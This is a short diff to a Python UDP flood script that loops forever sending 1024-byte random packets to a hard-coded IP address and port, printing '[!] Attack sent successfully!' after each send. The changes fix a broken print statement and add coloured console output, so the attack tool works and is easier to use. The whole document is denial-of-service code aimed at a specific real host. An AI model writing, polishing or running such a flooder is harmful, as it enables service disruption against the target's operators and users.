@@ -3,6 +3,7 @@ import random
 import time
 from colorama import Fore, init
 
+init(autoreset=True)
 
 UDP_IP = "185.107.192.21" 
 UDP_PORT = 51814  
@@ -14,12 +15,11 @@ def generate_random_data(size):
 
 try:
     while True:
-
         message = generate_random_data(1024)  
         sock.sendto(message, (UDP_IP, UDP_PORT))
-        print("Fore.LIGHTGREEN_EX + "[!] Attack sent successfully!")
+        print(Fore.LIGHTGREEN_EX + "[!] Attack sent successfully!")  
         time.sleep(0.1)  
 except KeyboardInterrupt:
-    print("Stopped by user")
+    print(Fore.YELLOW + "Stopped by user") 
 except Exception as e:
-    print(f"Error: {e}")
+    print(Fore.RED + f"Error: {e}")  
